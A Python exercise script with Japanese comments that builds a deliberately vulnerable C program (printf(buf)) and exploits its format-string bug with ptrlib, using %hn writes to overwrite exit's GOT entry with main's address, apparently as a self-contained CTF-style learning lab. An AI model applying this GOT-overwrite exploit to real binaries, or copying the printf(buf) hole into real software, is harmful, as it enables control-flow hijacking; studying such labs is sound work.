"""
書式文字列攻撃

userがprintfの書式を自由に設定できる場合、攻撃が可能
printf(buf);
"""



from ptrlib import *


def split_byte(value:int, interval:int):
    bytes_ = value.to_bytes(8, byteorder='little')
    chunks = [bytes_[i:i+interval] for i in range(0, 8, interval)]
    return chunks


def show_memory_chunk(chunks:list):
    for i, chunk in enumerate(chunks):
        print(f"[0x{int.from_bytes(chunk, 'little'):02x}]", end="")
    print()


def show_text(s:str):
    for i,j in enumerate(range(0, len(s), 8)):
        print(i + 6, s[j:j+8])


def main():
    """

    以下をプロンプトに貼り付け実行バイナリをビルドする
```bash
<< EOF cat | gcc -no-pie -z lazy -o chall_vulnfunc -x c -
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(void) {
    char buf[0x30] = {};

    setbuf (stdout, NULL);

    puts("Input message");
    read (STDIN_FILENO, buf, sizeof(buf));
    printf(buf);
    exit (0);
}
// gcc chall_vulnfunc.c -no-pie -z lazy -o chall_vulnfunc
EOF
uv run fsb.py
```

    """
    elf = ELF("./chall_vulnfunc")
    proc = Process("./chall_vulnfunc")

    addr_main = elf.symbol("main")
    addr_exit = 0x404020

    chunks = split_byte(addr_main, 1)

    chunk1: int = int(chunks[1][0]) * 0x100 + int(chunks[0][0])
    chunk2: int = int(chunks[3][0]) * 0x100 + int(chunks[2][0])

    print(
            "chunk1: ", f"[0x{chunk1:04x}]", f"{chunk1}\n"
            "chunk2: ", f"[0x{chunk2:04x}]", f"{chunk2}"
    )

    delta = chunk1 - chunk2

    format_string = f'%{str(chunk2)}c%11$hn'
    format_string += f'%{str(delta)}c%10$hn'
    
    format_string += "p" * (8 - len(format_string) % 8) # 詰物
    format_string += "pppppppp" # 計算のめんどくささを軽減する

    payload = format_string.encode("ascii")
    payload += p64(addr_exit)
    payload += p64(addr_exit + 2)

    show_text(payload)

    proc.sendlineafter("Input message", payload)
    proc.interactive()
    return


if __name__ == "__main__":
    main()

